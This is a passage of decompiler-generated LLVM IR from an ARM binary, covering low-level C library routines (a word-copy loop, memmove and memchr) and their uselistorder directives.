  %v11_15e80 = inttoptr i32 %v10_15e80 to i32*
  %v12_15e80 = load i32, i32* %v11_15e80, align 4
  store i32 %v10_15e80, i32* %r1.global-to-local, align 4
  %v4_15e84 = udiv i32 %v12_15e80, 256
  %v5_15e84 = or i32 %v4_15e84, %v3_15e7c
  store i32 %v5_15e84, i32* %lr.global-to-local, align 4
  %v3_15e88 = mul i32 %v12_15e80, 16777216
  %v4_15e8c = udiv i32 %v9_15e80, 256
  %v5_15e8c = or i32 %v3_15e88, %v4_15e8c
  store i32 %v5_15e8c, i32* %ip.global-to-local, align 4
  %v3_15e90 = mul i32 %v9_15e80, 16777216
  %v4_15e94 = udiv i32 %v6_15e80, 256
  %v5_15e94 = or i32 %v3_15e90, %v4_15e94
  store i32 %v5_15e94, i32* %r5.global-to-local, align 4
  %v3_15e98 = mul i32 %v6_15e80, 16777216
  %v4_15e9c = udiv i32 %v3_15e80, 256
  %v5_15e9c = or i32 %v3_15e98, %v4_15e9c
  store i32 %v5_15e9c, i32* %r4.global-to-local, align 4
  %v1_15ea0 = add i32 %v0_15ea0, -16
  %v2_15ea0 = inttoptr i32 %v1_15ea0 to i32*
  store i32 %v5_15e9c, i32* %v2_15ea0, align 4
  %v4_15ea0 = add i32 %v0_15ea0, -12
  %v5_15ea0 = inttoptr i32 %v4_15ea0 to i32*
  %v6_15ea0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15ea0, i32* %v5_15ea0, align 4
  %v7_15ea0 = add i32 %v0_15ea0, -8
  %v8_15ea0 = inttoptr i32 %v7_15ea0 to i32*
  %v9_15ea0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15ea0, i32* %v8_15ea0, align 4
  %v10_15ea0 = add i32 %v0_15ea0, -4
  %v11_15ea0 = inttoptr i32 %v10_15ea0 to i32*
  %v12_15ea0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15ea0, i32* %v11_15ea0, align 4
  store i32 %v1_15ea0, i32* %r0.global-to-local, align 4
  %v0_15ea4 = load i32, i32* %r2.global-to-local, align 4
  %v2_15ea4 = add i32 %v0_15ea4, -16
  store i32 %v2_15ea4, i32* %r2.global-to-local, align 4
  %v6_15ea8 = icmp slt i32 %v0_15ea4, 16
  br i1 %v6_15ea8, label %dec_label_pc_15eac, label %dec_label_pc_15e7c.dec_label_pc_15e7c_crit_edge

dec_label_pc_15e7c.dec_label_pc_15e7c_crit_edge:  ; preds = %dec_label_pc_15e7c
  %v0_15e7c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15e80.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15e7c

dec_label_pc_15eac:                               ; preds = %dec_label_pc_15e7c
  %v2_15eac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15eac, i32* @r4, align 4
  %v5_15eac = load i8*, i8** %stack_var_-8, align 4
  %v6_15eac = ptrtoint i8* %v5_15eac to i32
  store i32 %v6_15eac, i32* @r5, align 4
  store i32 %v11_15e78, i32* @lr, align 4
  %v2_15eb0 = add i32 %v0_15ea4, -4
  store i32 %v2_15eb0, i32* %r2.global-to-local, align 4
  %v4_15eb0 = add i32 %v0_15ea4, 2147483632
  %v5_15eb0 = and i32 %v2_15eb0, %v4_15eb0
  %v6_15eb0 = icmp slt i32 %v5_15eb0, 0
  store i1 %v6_15eb0, i1* %cpsr_v.global-to-local, align 1
  %v7_15eb0 = icmp slt i32 %v2_15eb0, 0
  store i1 %v7_15eb0, i1* %cpsr_n.global-to-local, align 1
  %v5_15eb4 = icmp slt i32 %v2_15ea4, -12
  br i1 %v5_15eb4, label %dec_label_pc_15ed0, label %dec_label_pc_15eb8

dec_label_pc_15eb8:                               ; preds = %dec_label_pc_15eac, %dec_label_pc_15e6c, %dec_label_pc_15eb8
  %v1_15ec4 = phi i32 [ %v5_15ec4, %dec_label_pc_15eb8 ], [ %v1_15ea0, %dec_label_pc_15eac ], [ %v0_15dc831, %dec_label_pc_15e6c ]
  %v0_15eb8 = load i32, i32* %r3.global-to-local, align 4
  %v3_15eb8 = mul i32 %v0_15eb8, 16777216
  store i32 %v3_15eb8, i32* %ip.global-to-local, align 4
  %v0_15ebc = load i32, i32* %r1.global-to-local, align 4
  %v1_15ebc = add i32 %v0_15ebc, -4
  %v2_15ebc = inttoptr i32 %v1_15ebc to i32*
  %v3_15ebc = load i32, i32* %v2_15ebc, align 4
  store i32 %v3_15ebc, i32* %r3.global-to-local, align 4
  store i32 %v1_15ebc, i32* %r1.global-to-local, align 4
  %v4_15ec0 = udiv i32 %v3_15ebc, 256
  %v5_15ec0 = or i32 %v4_15ec0, %v3_15eb8
  store i32 %v5_15ec0, i32* %ip.global-to-local, align 4
  %v2_15ec4 = add i32 %v1_15ec4, -4
  %v3_15ec4 = inttoptr i32 %v2_15ec4 to i32*
  store i32 %v5_15ec0, i32* %v3_15ec4, align 4
  %v4_15ec4 = load i32, i32* %r0.global-to-local, align 4
  %v5_15ec4 = add i32 %v4_15ec4, -4
  store i32 %v5_15ec4, i32* %r0.global-to-local, align 4
  %v0_15ec8 = load i32, i32* %r2.global-to-local, align 4
  %v2_15ec8 = add i32 %v0_15ec8, -4
  store i32 %v2_15ec8, i32* %r2.global-to-local, align 4
  %v6_15ecc = icmp slt i32 %v0_15ec8, 4
  br i1 %v6_15ecc, label %dec_label_pc_15ed0.loopexit, label %dec_label_pc_15eb8

dec_label_pc_15ed0.loopexit:                      ; preds = %dec_label_pc_15eb8
  %v4_15ec8 = sub i32 3, %v0_15ec8
  %v5_15ec8 = and i32 %v4_15ec8, %v0_15ec8
  %v6_15ec8 = icmp slt i32 %v5_15ec8, 0
  %v7_15ec8 = icmp slt i32 %v2_15ec8, 0
  store i1 %v6_15ec8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15ec8, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15ed0

dec_label_pc_15ed0:                               ; preds = %dec_label_pc_15ed0.loopexit, %dec_label_pc_15eac
  %v2_15d3c65 = phi i32 [ %v5_15ec4, %dec_label_pc_15ed0.loopexit ], [ %v1_15ea0, %dec_label_pc_15eac ]
  %v0_15d2c61 = phi i32 [ %v2_15ec8, %dec_label_pc_15ed0.loopexit ], [ %v2_15eb0, %dec_label_pc_15eac ]
  %v0_15ed0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ed0 = add i32 %v0_15ed0, 1
  store i32 %v1_15ed0, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_15ec4, { 0, 2, 1 }
  uselistorder i32 %v3_15eb8, { 1, 0 }
  uselistorder i32 %v2_15eb0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15ea0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15e80, { 1, 0 }
  uselistorder i32 %v3_15e7c, { 1, 0 }
  uselistorder i32 %v0_15e80, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15ea0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15e58, { 0, 2, 1 }
  uselistorder i32 %v3_15e4c, { 1, 0 }
  uselistorder i32 %v2_15e44, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15e34, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15e14, { 1, 0 }
  uselistorder i32 %v3_15e10, { 1, 0 }
  uselistorder i32 %v0_15e14, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15e34, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15dec, { 0, 2, 1 }
  uselistorder i32 %v3_15de0, { 1, 0 }
  uselistorder i32 %v2_15dd8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15dc8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15da8, { 1, 0 }
  uselistorder i32 %v3_15da4, { 1, 0 }
  uselistorder i32 %v0_15da8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15dc8, { 3, 2, 1, 0 }
  uselistorder i1 %v5_15e70, { 2, 0, 1 }
  uselistorder i32 %v0_15d88, { 1, 0 }
  uselistorder i32 %v0_15e74, { 3, 0, 2, 1 }
  uselistorder i32 %v0_15dc831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_15d78, { 2, 1, 0 }
  uselistorder i32 %v0_15d78, { 2, 0, 1 }
  uselistorder i32 %v2_15d70, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_15d70, { 1, 0, 2 }
  uselistorder i32 %v0_15d70, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15dc832, { 2, 1, 0 }
  uselistorder i32 %v11_15d4c, { 1, 0 }
  uselistorder i32 %v7_15d4c, { 1, 0 }
  uselistorder i32 %v1_15d2c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_15d2c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15d30, { 1, 0 }
  uselistorder i32 %v7_15d24, { 0, 2, 1 }
  uselistorder i32 %v10_15d20, { 1, 0 }
  uselistorder i32 %v9_15d18, { 1, 0, 2 }
  uselistorder i32 %v6_15d14, { 1, 0 }
  uselistorder i32 %v2_15d0c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_15d0c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_15d1c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15d00, { 0, 2, 1 }
  uselistorder i32 %v13_15cfc, { 1, 0 }
  uselistorder i32 %v4_15cf8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_15cf8, { 2, 0, 1 }
  uselistorder i32 %v6_15d00, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15cf0, { 0, 2, 1 }
  uselistorder i32 %v16_15cec, { 1, 0 }
  uselistorder i32 %v4_15ce8, { 1, 0 }
  uselistorder i32 %v0_15cf8.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_15cf0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15cdc, { 0, 3, 2, 1 }
  uselistorder i32 %v10_15cd8, { 1, 0 }
  uselistorder i32 %v1_15cd4, { 1, 0 }
  uselistorder i32 %v10_15cd0, { 1, 0 }
  uselistorder i32 %v0_15cd0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15cd4, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_15cc8, { 0, 2, 1 }
  uselistorder i32 %v2_15cbc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_15cbc, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_15cd449, { 1, 2, 0 }
  uselistorder i32 %v1_15cb4, { 2, 1, 0 }
  uselistorder i32 %v1_15cac, { 2, 3, 1, 0 }
  uselistorder i32 %v2_15ca4, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_15ca0, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_15c9c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_15c9c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_15c88, { 0, 2, 1 }
  uselistorder i32 %v3_15c7c, { 1, 0 }
  uselistorder i32 %v2_15c74, { 0, 2, 1, 3 }
  uselistorder i32 %v12_15c64, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15c44, { 1, 0, 2 }
  uselistorder i32 %v5_15c44, { 1, 0, 2 }
  uselistorder i32 %v2_15c44, { 1, 0, 2 }
  uselistorder i32 %v3_15c40, { 1, 0 }
  uselistorder i32 %v0_15c44, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15c64, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_15c1c, { 0, 2, 1 }
  uselistorder i32 %v3_15c10, { 1, 0 }
  uselistorder i32 %v2_15c08, { 0, 2, 1, 3 }
  uselistorder i32 %v12_15bf8, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15bd8, { 1, 0, 2 }
  uselistorder i32 %v5_15bd8, { 1, 0, 2 }
  uselistorder i32 %v2_15bd8, { 1, 0, 2 }
  uselistorder i32 %v3_15bd4, { 1, 0 }
  uselistorder i32 %v0_15bd8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15bf8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_15bb0, { 0, 2, 1 }
  uselistorder i32 %v3_15ba4, { 1, 0 }
  uselistorder i32 %v2_15b9c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_15b8c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15b6c, { 1, 0, 2 }
  uselistorder i32 %v5_15b6c, { 1, 0, 2 }
  uselistorder i32 %v2_15b6c, { 1, 0, 2 }
  uselistorder i32 %v3_15b68, { 1, 0 }
  uselistorder i32 %v0_15b6c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15b8c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_15c34, { 2, 0, 1 }
  uselistorder i32 %v0_15c38, { 3, 0, 2, 1 }
  uselistorder i32 %v0_15b8c75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_15b3c, { 1, 0 }
  uselistorder i32 %v0_15b3c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_15b34, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_15b34, { 1, 0, 2 }
  uselistorder i32 %v0_15b34, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15b8c76, { 2, 1, 0 }
  uselistorder i32 %v1_15b14, { 1, 0, 2 }
  uselistorder i32 %v1_15aec, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_15aec, { 1, 2, 0, 3 }
  uselistorder i32 %v8_15ad8, { 1, 0, 2 }
  uselistorder i32 %v6_15ad4, { 1, 0 }
  uselistorder i32 %v2_15acc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_15acc, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_15adc, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_15ac4, { 0, 2, 1 }
  uselistorder i1 %v0_15ac4, { 1, 0 }
  uselistorder i1 %v1_15ac4, { 1, 0 }
  uselistorder i32 %v3_15ac0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15ab8, { 0, 2, 1, 3 }
  uselistorder i32 %v4_15aa4, { 1, 0 }
  uselistorder i32 %v12_15a98, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15a8c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15a90, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_15a80, { 0, 2, 1 }
  uselistorder i32 %v2_15a78, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_15a78, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_15a70, { 1, 0 }
  uselistorder i32 %v1_15a68, { 2, 1, 0 }
  uselistorder i32 %v2_15a60, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_15a60, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15a50, { 1, 0 }
  uselistorder i32 %v1_15a50, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_15a50, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 13, 14, 15, 16, 17, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 18, 19, 20, 12, 13, 14, 15, 16, 17, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 34, 35, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 37, 38, 39, 40 }
  uselistorder i32* %r2.global-to-local, { 0, 38, 1, 2, 3, 4, 5, 39, 6, 7, 8, 9, 10, 40, 11, 12, 13, 14, 15, 41, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 42, 43, 67, 44, 45, 46, 47, 48, 68, 49, 51, 50, 30, 31, 65, 32, 33, 34, 35, 36, 66, 37, 53, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 69 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 30, 27, 29, 28, 31, 33, 34, 32, 18, 19, 22, 20, 24, 21, 23, 25, 26, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 3, 41, 4, 5, 42, 6, 7, 43, 8, 9, 10, 11, 12, 13, 44, 14, 16, 15, 17, 18, 45, 19, 20, 46, 21, 22, 23, 24, 47, 48, 49, 50, 51, 52, 53, 25, 30, 26, 27, 28, 29, 31, 32, 0, 33, 34, 36, 35, 37, 38, 57, 39, 40, 54, 58, 55, 56, 59, 60, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 32, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 23, 24, 25, 26, 27, 28, 29, 30, 31, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i1* %cpsr_v.global-to-local, { 28, 1, 29, 3, 0, 4, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 27, 15, 16, 30, 24, 31, 25, 33, 26, 17, 32, 18, 19, 20, 21, 22, 23, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i1* %cpsr_n.global-to-local, { 30, 1, 31, 3, 0, 4, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 29, 16, 17, 33, 32, 34, 26, 35, 27, 37, 28, 18, 36, 19, 20, 21, 22, 23, 24, 25, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 3, 4, 5, 22, 6, 23, 24, 26, 27, 28, 25 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0, 22 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15eb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15e4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15de0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15d80, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_15d0c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_15cd0, { 1, 0 }
  uselistorder label %dec_label_pc_15cbc, { 1, 0 }
  uselistorder label %dec_label_pc_15c7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15c10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15ba4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15b44, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 5, 6, 4, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_15ab8, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_15a78, { 1, 0 }
}

define i32 @function_15ed8(i32 %arg1) local_unnamed_addr {
dec_label_pc_15ed8:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_15ee0 = load i32, i32* @r0, align 4
  %v1_15ee0 = load i32, i32* @r1, align 4
  %v2_15ee0 = inttoptr i32 %v0_15ee0 to i8*
  %v3_15ee0 = call i32 @_memcpy(i8* %v2_15ee0, i32 %v1_15ee0)
  ret i32 %v3_15ee0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 1, 2, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_15ef0 = load i32, i32* @r4, align 4
  %v6_15ef0 = load i32, i32* @r5, align 4
  %v9_15ef0 = load i32, i32* @r6, align 4
  %v1_15ef4 = urem i32 %arg1, 256
  %v0_15f1018 = load i32, i32* @r2, align 4
  %v2_15f1020 = icmp eq i32 %v0_15f1018, 0
  br i1 %v2_15f1020, label %dec_label_pc_15f20, label %dec_label_pc_15f18

dec_label_pc_15efc:                               ; preds = %dec_label_pc_15f18
  %v3_15efc = load i8, i8* %.021, align 1
  %v4_15efc = zext i8 %v3_15efc to i32
  %v9_15f00 = icmp eq i32 %v4_15efc, %v1_15ef4
  %v1_15f04 = add i32 %v0_15f04, -1
  br i1 %v9_15f00, label %bb, label %dec_label_pc_15f10

bb:                                               ; preds = %dec_label_pc_15efc
  ret i32 %v1_15f18

dec_label_pc_15f10:                               ; preds = %dec_label_pc_15efc
  %v2_15f0c = add i32 %v1_15f18, 1
  %v3_15f0c = inttoptr i32 %v2_15f0c to i8*
  %v2_15f10 = icmp eq i32 %v1_15f04, 0
  br i1 %v2_15f10, label %dec_label_pc_15f20, label %dec_label_pc_15f18

dec_label_pc_15f18:                               ; preds = %entry, %dec_label_pc_15f10
  %v0_15f04 = phi i32 [ %v1_15f04, %dec_label_pc_15f10 ], [ %v0_15f1018, %entry ]
  %.021 = phi i8* [ %v3_15f0c, %dec_label_pc_15f10 ], [ undef, %entry ]
  %v1_15f18 = ptrtoint i8* %.021 to i32
  %v2_15f18 = urem i32 %v1_15f18, 4
  %v3_15f18 = icmp eq i32 %v2_15f18, 0
  br i1 %v3_15f18, label %dec_label_pc_15f20, label %dec_label_pc_15efc

dec_label_pc_15f20:                               ; preds = %dec_label_pc_15f10, %dec_label_pc_15f18, %entry
  %v0_15fac37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_15f10 ], [ %v0_15f04, %dec_label_pc_15f18 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_15f0c, %dec_label_pc_15f10 ], [ %.021, %dec_label_pc_15f18 ]
  %v4_15f20 = mul nuw nsw i32 %v1_15ef4, 256
  %v5_15f20 = or i32 %v4_15f20, %v1_15ef4
  %v1_15f24 = ptrtoint i8* %.0.lcssa to i32
  %v4_15f28 = mul i32 %v5_15f20, 65536
  %v5_15f28 = or i32 %v4_15f28, %v5_15f20
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_15fac37, 3
  br i1 %tmp, label %dec_label_pc_15f30, label %dec_label_pc_15fd4.preheader

dec_label_pc_15f30:                               ; preds = %dec_label_pc_15f20, %dec_label_pc_15fac.backedge
  %v0_15f4c82 = phi i32 [ %v1_15f4c, %dec_label_pc_15fac.backedge ], [ %v0_15fac37, %dec_label_pc_15f20 ]
  %v0_15f3081 = phi i32 [ %v4_15f30, %dec_label_pc_15fac.backedge ], [ %v1_15f24, %dec_label_pc_15f20 ]
  %v1_15f30 = inttoptr i32 %v0_15f3081 to i32*
  %v2_15f30 = load i32, i32* %v1_15f30, align 4
  %v4_15f30 = add i32 %v0_15f3081, 4
  %v2_15f34 = xor i32 %v2_15f30, %v5_15f28
  %v2_15f38 = add i32 %v2_15f34, 2130640639
  %v1_15f3c = sub i32 -1, %v2_15f34
  %v2_15f40 = xor i32 %v2_15f38, %v1_15f3c
  %v2_15f44 = and i32 %v2_15f40, -2130640640
  %v2_15f48 = icmp eq i32 %v2_15f44, 0
  %v1_15f4c = add i32 %v0_15f4c82, -4
  br i1 %v2_15f48, label %dec_label_pc_15fac.backedge, label %dec_label_pc_15f54

dec_label_pc_15fac.backedge:                      ; preds = %dec_label_pc_15f30, %dec_label_pc_15f98
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_15f4c, 3
  br i1 %tmp107, label %dec_label_pc_15f30, label %dec_label_pc_15fd4.preheader

dec_label_pc_15f54:                               ; preds = %dec_label_pc_15f30
  %v2_15f54 = inttoptr i32 %v0_15f3081 to i8*
  %v3_15f54 = load i8, i8* %v2_15f54, align 1
  %v4_15f54 = zext i8 %v3_15f54 to i32
  %v9_15f5c = icmp eq i32 %v4_15f54, %v1_15ef4
  %v1_15f60 = add i32 %v0_15f3081, 3
  %v1_15f64 = add i32 %v0_15f3081, 1
  store i32 %v1_15f64, i32* @lr, align 4
  %v1_15f68 = add i32 %v0_15f3081, 2
  br i1 %v9_15f5c, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_15f54
  store i32 %v3_15ef0, i32* @r4, align 4
  store i32 %v6_15ef0, i32* @r5, align 4
  store i32 %v9_15ef0, i32* @r6, align 4
  ret i32 %v0_15f3081

bb51:                                             ; preds = %dec_label_pc_15f54
  %v2_15f70 = inttoptr i32 %v1_15f64 to i8*
  %v3_15f70 = load i8, i8* %v2_15f70, align 1
  %v4_15f70 = zext i8 %v3_15f70 to i32
  %v9_15f74 = icmp eq i32 %v4_15f70, %v1_15ef4
  br i1 %v9_15f74, label %dec_label_pc_15f7c, label %dec_label_pc_15f84

dec_label_pc_15f7c:                               ; preds = %bb51
  store i32 %v3_15ef0, i32* @r4, align 4
  store i32 %v6_15ef0, i32* @r5, align 4
  store i32 %v9_15ef0, i32* @r6, align 4
  ret i32 %v1_15f64

dec_label_pc_15f84:                               ; preds = %bb51
  %v2_15f84 = inttoptr i32 %v1_15f68 to i8*
  %v3_15f84 = load i8, i8* %v2_15f84, align 1
  %v4_15f84 = zext i8 %v3_15f84 to i32
  %v9_15f88 = icmp eq i32 %v4_15f84, %v1_15ef4
  br i1 %v9_15f88, label %dec_label_pc_15f90, label %dec_label_pc_15f98

dec_label_pc_15f90:                               ; preds = %dec_label_pc_15f84
  store i32 %v3_15ef0, i32* @r4, align 4
  store i32 %v6_15ef0, i32* @r5, align 4
  store i32 %v9_15ef0, i32* @r6, align 4
  ret i32 %v1_15f68

dec_label_pc_15f98:                               ; preds = %dec_label_pc_15f84
  %v2_15f98 = inttoptr i32 %v1_15f60 to i8*
  %v3_15f98 = load i8, i8* %v2_15f98, align 1
  %v4_15f98 = zext i8 %v3_15f98 to i32
  %v9_15f9c = icmp eq i32 %v4_15f98, %v1_15ef4
  br i1 %v9_15f9c, label %dec_label_pc_15fa4, label %dec_label_pc_15fac.backedge

dec_label_pc_15fa4:                               ; preds = %dec_label_pc_15f98
  store i32 %v3_15ef0, i32* @r4, align 4
  store i32 %v6_15ef0, i32* @r5, align 4
  store i32 %v9_15ef0, i32* @r6, align 4
  ret i32 %v1_15f60

dec_label_pc_15fd4.preheader:                     ; preds = %dec_label_pc_15fac.backedge, %dec_label_pc_15f20
  %v0_15f30.lcssa = phi i32 [ %v1_15f24, %dec_label_pc_15f20 ], [ %v4_15f30, %dec_label_pc_15fac.backedge ]
  %v0_15f4c.lcssa = phi i32 [ %v0_15fac37, %dec_label_pc_15f20 ], [ %v1_15f4c, %dec_label_pc_15fac.backedge ]
  %v2_15fd411 = icmp eq i32 %v0_15f4c.lcssa, 0
  br i1 %v2_15fd411, label %dec_label_pc_15fdc, label %dec_label_pc_15fc4

dec_label_pc_15fc4:                               ; preds = %dec_label_pc_15fd4, %dec_label_pc_15fd4.preheader
  %v0_15fd4.in = phi i32 [ %v0_15fd4, %dec_label_pc_15fd4 ], [ %v0_15f4c.lcssa, %dec_label_pc_15fd4.preheader ]
  %v15_15fcc = phi i32 [ %v1_15fd0, %dec_label_pc_15fd4 ], [ %v0_15f30.lcssa, %dec_label_pc_15fd4.preheader ]
  %v0_15fd4 = add i32 %v0_15fd4.in, -1
  %v1_15fc4 = inttoptr i32 %v15_15fcc to i8*
  %v2_15fc4 = load i8, i8* %v1_15fc4, align 1
  %v3_15fc4 = zext i8 %v2_15fc4 to i32
  %v9_15fc8 = icmp eq i32 %v3_15fc4, %v1_15ef4
  br i1 %v9_15fc8, label %bb52, label %dec_label_pc_15fd4

bb52:                                             ; preds = %dec_label_pc_15fc4
  store i32 %v3_15ef0, i32* @r4, align 4
  store i32 %v6_15ef0, i32* @r5, align 4
  store i32 %v9_15ef0, i32* @r6, align 4
  ret i32 %v15_15fcc

dec_label_pc_15fd4:                               ; preds = %dec_label_pc_15fc4
  %v1_15fd0 = add i32 %v15_15fcc, 1
  %v2_15fd4 = icmp eq i32 %v0_15fd4, 0
  br i1 %v2_15fd4, label %dec_label_pc_15fdc, label %dec_label_pc_15fc4

dec_label_pc_15fdc:                               ; preds = %dec_label_pc_15fd4, %dec_label_pc_15fd4.preheader
  store i32 %v3_15ef0, i32* @r4, align 4
  store i32 %v6_15ef0, i32* @r5, align 4
  store i32 %v9_15ef0, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_15fcc, { 1, 0, 2 }
  uselistorder i32 %v1_15f4c, { 1, 0, 2 }
  uselistorder i32 %v0_15f3081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_15f20, { 1, 0 }
